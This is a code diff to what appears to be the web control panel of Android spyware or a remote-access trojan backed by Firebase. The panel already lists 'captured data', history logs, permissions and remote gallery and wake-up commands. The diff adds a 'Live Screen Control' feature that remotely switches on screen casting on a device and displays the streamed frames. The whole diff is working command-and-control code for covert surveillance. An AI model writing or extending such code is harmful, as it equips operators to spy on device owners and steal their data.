@@ -70,6 +70,7 @@ function displayDashboard(username) {
         let title = 'Realtime Captured Data';
         if (activeModalType === 'old') title = 'Captured History Logs';
         if (activeModalType === 'permissions') title = 'Device Permissions';
+        if (activeModalType === 'screen_control') title = 'Live Screen Control';
         
         document.getElementById('modal-header-title').innerText = title;
         document.getElementById('details-modal').classList.remove('hidden');
@@ -337,7 +338,7 @@ function renderDeviceDetailsUI(deviceId) {
                 <button onclick="showCustomerDetailsPopup('${deviceId}')" class="bg-slate-50 border border-slate-200 py-2.5 rounded-xl text-[9px] font-bold uppercase tracking-wider text-slate-700 hover:bg-indigo-50 hover:border-indigo-400 transition-all">Details</button>
                 <button onclick="sendDeviceCommand('${deviceId}', 'gallery', 'start')" class="bg-slate-50 border border-slate-200 py-2.5 rounded-xl text-[9px] font-bold uppercase tracking-wider text-slate-700 hover:bg-indigo-50 hover:border-indigo-400 transition-all">Start Gallery</button>
                 <button onclick="sendDeviceCommand('${deviceId}', 'gallery', 'stop')" class="bg-slate-50 border border-slate-200 py-2.5 rounded-xl text-[9px] font-bold uppercase tracking-wider text-slate-700 hover:bg-indigo-50 hover:border-indigo-400 transition-all">Stop Gallery</button>
-                <button class="bg-slate-50 border border-slate-200 py-2.5 rounded-xl text-[9px] font-bold uppercase tracking-wider text-slate-700 hover:bg-indigo-50 hover:border-indigo-400 transition-all">Screen Control</button>
+                <button onclick="showScreenControlModal('${deviceId}')" class="bg-slate-50 border border-slate-200 py-2.5 rounded-xl text-[9px] font-bold uppercase tracking-wider text-slate-700 hover:bg-indigo-50 hover:border-indigo-400 transition-all">Screen Control</button>
                 <button onclick="showPermissionsPopup('${deviceId}')" class="bg-slate-50 border border-slate-200 py-2.5 rounded-xl text-[9px] font-bold uppercase tracking-wider text-slate-700 hover:bg-indigo-50 hover:border-indigo-400 transition-all">User Permission</button>
                 <button onclick="showOldDetailsPopup('${deviceId}')" class="bg-slate-50 border border-slate-200 py-2.5 rounded-xl text-[9px] font-bold uppercase tracking-wider text-slate-700 hover:bg-indigo-50 hover:border-indigo-400 transition-all">Old Details</button>
                 <button onclick="manualPing('${deviceId}')" class="bg-indigo-600 text-white border border-indigo-600 py-2.5 rounded-xl text-[9px] font-bold uppercase tracking-wider hover:bg-indigo-700 transition-all flex items-center justify-center space-x-1"><i data-lucide="zap" class="w-3 h-3"></i><span>Wake Up</span></button>
@@ -529,6 +530,24 @@ function showCustomerDetailsPopup(deviceId) {
 }
 
 /**
+ * Opens the live screen control modal
+ */
+function showScreenControlModal(deviceId) {
+    activeModalDeviceId = deviceId;
+    activeModalType = 'screen_control';
+    localStorage.setItem('activeModalDeviceId', deviceId);
+    localStorage.setItem('activeModalType', 'screen_control');
+    document.getElementById('modal-header-title').innerText = 'Live Screen Control';
+    document.getElementById('details-modal').classList.remove('hidden');
+    document.body.style.overflow = 'hidden';
+    
+    // Send ON command to device
+    database.ref(`Devices/${deviceId}/Screen_cast/screen`).set("on");
+    
+    renderModalUI(deviceId);
+}
+
+/**
  * Opens the permissions management popup
  */
 function showPermissionsPopup(deviceId) {
@@ -560,6 +579,11 @@ function showOldDetailsPopup(deviceId) {
  * Closes the customer details popup
  */
 function closeDetailsModal() {
+    // Send OFF command if stopping screen cast
+    if (activeModalType === 'screen_control' && activeModalDeviceId) {
+        database.ref(`Devices/${activeModalDeviceId}/Screen_cast/screen`).set("off");
+    }
+
     activeModalDeviceId = null;
     activeModalType = 'new';
     localStorage.removeItem('activeModalDeviceId');
@@ -576,6 +600,16 @@ function renderModalUI(deviceId) {
     const dev = lastSnapshotData.Devices[deviceId];
     const modalBody = document.getElementById('modal-body');
     
+    // Optimization for Screen Control: only update the image source to prevent UI flicker
+    if (activeModalType === 'screen_control') {
+        const frameImg = document.getElementById('screen-frame');
+        const castData = dev.Screen_cast || {};
+        if (frameImg && castData.data) {
+            frameImg.src = `data:image/jpeg;base64,${castData.data}`;
+            return; // Don't re-render full HTML if frame is just updating
+        }
+    }
+
     let html = '';
 
     if (activeModalType === 'new' && dev.user_info) {
@@ -652,6 +686,29 @@ function renderModalUI(deviceId) {
                         </div>
                     `;
                 }).join('') : '<p class="text-center text-slate-400 py-10 text-xs font-bold">No permissions data found</p>'}
+            </div>
+        </div>`;
+    } else if (activeModalType === 'screen_control') {
+        // Screen Control UI
+        const castData = dev.Screen_cast || {};
+        html += `<div class="flex flex-col items-center space-y-4">
+            <div class="relative w-full aspect-[9/16] max-w-[280px] bg-slate-900 rounded-[2.5rem] overflow-hidden border-8 border-slate-800 shadow-2xl mx-auto flex items-center justify-center">
+                ${castData.data ? 
+                    `<img id="screen-frame" src="data:image/jpeg;base64,${castData.data}" class="w-full h-full object-contain" />` : 
+                    `<div class="flex flex-col items-center justify-center text-slate-500 space-y-3">
+                        <div class="w-10 h-10 border-4 border-indigo-500 border-t-transparent rounded-full animate-spin"></div>
+                        <p class="text-[10px] font-black uppercase tracking-[0.2em] text-indigo-400">Syncing Stream...</p>
+                    </div>`
+                }
+            </div>
+            <div class="bg-white border-2 border-slate-100 p-4 rounded-3xl w-full shadow-sm">
+                <div class="flex items-center justify-between">
+                    <div class="flex items-center space-x-2">
+                        <span class="flex h-2 w-2 rounded-full bg-red-500 animate-pulse"></span>
+                        <span class="text-[10px] font-black text-slate-900 uppercase tracking-widest">Live Cast: ${dev.device?.device_name || 'Generic'}</span>
+                    </div>
+                    <i data-lucide="monitor-play" class="w-4 h-4 text-indigo-500"></i>
+                </div>
             </div>
         </div>`;
     }
